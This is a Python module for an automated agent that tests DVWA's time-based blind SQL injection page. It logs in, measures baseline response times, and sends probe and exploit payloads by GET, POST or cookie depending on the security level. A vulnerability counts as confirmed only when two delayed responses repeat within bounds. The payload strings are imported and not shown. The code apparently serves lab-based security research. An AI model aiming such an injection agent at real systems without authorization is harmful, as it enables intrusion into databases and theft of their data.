"""SQLi Time-based blind injection agent with real HTTP execution."""

from __future__ import annotations

import logging
import time
from typing import Any
from urllib.parse import quote

from agents.agent_telemetry import exploit_event, probe_event, score_event
from agents.state_utils import already_tried_payloads, candidate_payloads_for_stage, chain_check as _chain_check, make_update, normalize_security_level
from core.state import ExploitationState, MODULE_TO_KG_NODE
from foundation.payload_library import PayloadLibrary
from foundation.payload_validator import bounded_sleep_delays
from foundation.session_manager import DVWASession
from foundation.verifier import usable_blind_response

logger = logging.getLogger(__name__)

AGENT_ID = "sqli_time_blind"
MODULE_PATH = "/vulnerabilities/sqli_blind/"
HIGH_RESULT_PATH = MODULE_PATH
_PROBE_OBSERVATION_KEY = "response_delay_measurable"

TIME_THRESHOLD_MEDIUM = 1.8  # seconds — medium DVWA timing has lower jitter margin
TIME_THRESHOLD_HIGH = 2.5  # seconds — retain the strict high-level threshold
TIME_THRESHOLD = TIME_THRESHOLD_HIGH  # Backward-compatible high-level alias


def _request_high_via_cookie(session: DVWASession, payload: str):
    """DVWA's high blind module reads id from a cookie, not the SQLi session."""
    session.http.set_cookie("id", quote(payload, safe=""))
    return session.get(MODULE_PATH)


def _request(session: DVWASession, security_level: str, payload: str):
    """Submit a SQLi form using the method exposed by the DVWA level."""
    request_data = {"id": payload, "Submit": "Submit"}
    if security_level == "medium":
        return session.post(MODULE_PATH, data=request_data)
    if security_level == "high":
        return _request_high_via_cookie(session, payload)
    return session.get(MODULE_PATH, params=request_data)


def _get_baseline_timing(
    session: DVWASession,
    samples: int = 3,
    security_level: str = "low",
) -> float:
    """Measure baseline request timing using median of multiple samples.

    Returns the median elapsed time in seconds. If all samples fail,
    returns 0.0.
    """
    times: list[float] = []
    for _ in range(samples):
        try:
            start = time.monotonic()
            response = _request(session, security_level, "1")
            if response.status_code == 200:
                times.append(time.monotonic() - start)
        except Exception:
            continue
    if not times:
        return 0.0
    sorted_times = sorted(times)
    median = sorted_times[len(sorted_times) // 2]
    return median


def _probe_preconditions(
    session: DVWASession,
    payloads: list[str],
    already_tried: set[str],
    security_level: str = "high",
) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
    """Send time-based delay payloads and measure response elapsed time.

    Returns (precondition_met, tried_payloads, observations, telemetry_events).
    """
    observations: dict[str, bool] = {}
    tried: list[str] = []
    events: list[dict] = []
    sent_any = False
    threshold = TIME_THRESHOLD_MEDIUM if security_level == "medium" else TIME_THRESHOLD_HIGH

    # Get a baseline timing with a harmless request
    baseline_elapsed = _get_baseline_timing(session, security_level=security_level)
    if baseline_elapsed == 0.0:
        # All baseline attempts failed
        return False, tried, {}, events

    for payload in payloads:
        if payload in already_tried:
            continue
        sent_any = True
        tried.append(payload)
        try:
            start = time.monotonic()
            resp = _request(session, security_level, payload)
            elapsed = time.monotonic() - start
            baseline_ms = baseline_elapsed * 1000
            elapsed_ms = elapsed * 1000
            events.append(probe_event(
                AGENT_ID,
                payload,
                resp.status_code,
                usable_blind_response(resp, allow_missing=True) and elapsed - baseline_elapsed > threshold,
                endpoint=HIGH_RESULT_PATH if security_level == "high" else MODULE_PATH,
                elapsed_ms=elapsed_ms,
                baseline_elapsed_ms=baseline_ms,
                delay_ms=elapsed_ms - baseline_ms,
             response=resp))
            # Check if response time significantly exceeds baseline
            if usable_blind_response(resp, allow_missing=True) and elapsed - baseline_elapsed > threshold:
                observations[_PROBE_OBSERVATION_KEY] = True
                return True, tried, observations, events
        except Exception as exc:
            logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
            events.append(probe_event(AGENT_ID, payload, None, False))

    if not sent_any:
        # Don't overwrite prior observation if we didn't send any requests
        return False, tried, {}, events
    observations[_PROBE_OBSERVATION_KEY] = False
    return False, tried, observations, events


def _attempt_exploit(
    session: DVWASession,
    payloads: list[str],
    already_tried: set[str],
    security_level: str = "high",
) -> tuple[int, list[str], list[str], list[dict]]:
    """Try time-blind exploit payloads. Returns (score, tried, confirmed_vulns, events)."""
    tried: list[str] = []
    events: list[dict] = []
    confirmed: list[str] = []
    score = 0
    threshold = TIME_THRESHOLD_MEDIUM if security_level == "medium" else TIME_THRESHOLD_HIGH

    # Baseline timing (extracted helper)
    baseline_elapsed = _get_baseline_timing(session, security_level=security_level)
    if baseline_elapsed <= 0:
        return score, tried, confirmed, events

    for payload in payloads:
        if payload in already_tried:
            continue
        tried.append(payload)
        try:
            bounded_delay = sum(bounded_sleep_delays(payload))
            start = time.monotonic()
            resp = _request(session, security_level, payload)
            elapsed = time.monotonic() - start
            baseline_ms = baseline_elapsed * 1000
            elapsed_ms = elapsed * 1000
            delay = elapsed - baseline_elapsed
            valid_delay = usable_blind_response(resp, allow_missing=True) and threshold < delay <= bounded_delay + threshold
            events.append(exploit_event(
                AGENT_ID,
                payload,
                resp.status_code,
                valid_delay,
                endpoint=HIGH_RESULT_PATH if security_level == "high" else MODULE_PATH,
                elapsed_ms=elapsed_ms,
                baseline_elapsed_ms=baseline_ms,
                delay_ms=elapsed_ms - baseline_ms,
             response=resp))
            events[-1]["payload"].update(verified_grade=2 if valid_delay else 0,
                verification_reason="bounded_delay_signal" if valid_delay else "timing_not_verified")
            if valid_delay:
                # A second transaction with the same validated candidate rules
                # out a single slow response, including medium's single seed.
                control = _get_baseline_timing(session, security_level=security_level)
                if control <= 0:
                    continue
                start = time.monotonic()
                repeated = _request(session, security_level, payload)
                repeated_elapsed = time.monotonic() - start
                repeat_ok = usable_blind_response(repeated, allow_missing=True) and threshold < repeated_elapsed - control <= bounded_delay + threshold
                events.append(exploit_event(
                    AGENT_ID, payload, repeated.status_code, repeat_ok,
                    endpoint=HIGH_RESULT_PATH if security_level == "high" else MODULE_PATH,
                    elapsed_ms=repeated_elapsed * 1000,
                    baseline_elapsed_ms=control * 1000,
                    delay_ms=(repeated_elapsed - control) * 1000,
                 response=repeated))
                if not repeat_ok:
                    continue
                # Two bounded transactions of this candidate, each compared
                # with successful harmless controls, establish repeatability.
                events[-1]["payload"].update(verified_grade=3, verification_reason="verified_repeatable_bounded_delay")
                score = 3
                confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
                break
        except Exception as exc:
            logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
            events.append(exploit_event(AGENT_ID, payload, None, False))

    return score, tried, confirmed, events

def sqli_time_blind_agent(state: ExploitationState) -> dict[str, Any]:
    """Execute the SQL injection time-blind static method agent.

    Reads validated candidate queues, target configuration, prior attempts, and
    timing observations. The agent establishes whether response delay is
    measurable, sends time-delay payloads through HTTP, confirms
    `sqli_time_blind_confirmed` when timing evidence is sufficient, and applies
    shared chain scoring after confirmation.

    Args:
        state: Current shared LangGraph state.

    Returns:
        Partial state update for observations, tried payloads, scores,
        confirmed vulnerabilities, achieved outcomes, and telemetry events.
    """
    target_url = state.get("target_url", "")
    security_level = normalize_security_level(state.get("security_level"))

    if not target_url:
        return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])

    session = DVWASession(target_url)
    try:
        if not session.login():
            return make_update(
                state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
                failure_agents=[AGENT_ID],
            )
        session.set_security_level(security_level)

        already_tried = already_tried_payloads(state, AGENT_ID)
        confirmed_vulns: list[str] = []
        achieved_outcomes: list[str] = []
        score = 0
        telemetry_events: list[dict[str, Any]] = []
        all_tried: list[str] = []
        observations: dict[str, bool] = {}

        # Stage 1: PROBE
        probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe")
        probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
            session, probe_payloads, already_tried, security_level
        )
        all_tried.extend(tried)
        telemetry_events.extend(probe_events)
        observations.update(probe_obs)

        if not probe_ok:
            update = make_update(
                state=state, module_name=AGENT_ID, score=0,
                tried_payloads=all_tried, telemetry_events=telemetry_events,
            )
            update["observations"] = observations
            return update

        score = max(score, 1)

        # Stage 2: EXPLOIT
        all_exploit = candidate_payloads_for_stage(state, AGENT_ID, security_level, "exploit")

        exploit_score, tried, confirmed, exploit_events = _attempt_exploit(
            session, all_exploit, already_tried | set(all_tried), security_level
        )
        all_tried.extend(tried)
        telemetry_events.extend(exploit_events)
        score = max(score, exploit_score)
        confirmed_vulns.extend(confirmed)

        # Stage 3: CHAIN CHECK
        if confirmed_vulns:
            chain_score, chain_achieved = _chain_check(confirmed_vulns[0], state)
            if chain_score >= 4:
                score = max(score, chain_score)
                achieved_outcomes.extend(chain_achieved)

        telemetry_events.append(score_event(AGENT_ID, score, confirmed_vulns, achieved_outcomes))

        update = make_update(
            state=state, module_name=AGENT_ID, score=score,
            tried_payloads=all_tried,
            confirmed_vulns=confirmed_vulns or None,
            achieved_outcomes=achieved_outcomes or None,
            telemetry_events=telemetry_events,
        )
        update["observations"] = observations
        return update
    except Exception as exc:
        logger.warning("[%s] Session or execution failed: %s", AGENT_ID, exc)
        return make_update(
            state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
            failure_agents=[AGENT_ID],
        )
    finally:
        session.close()
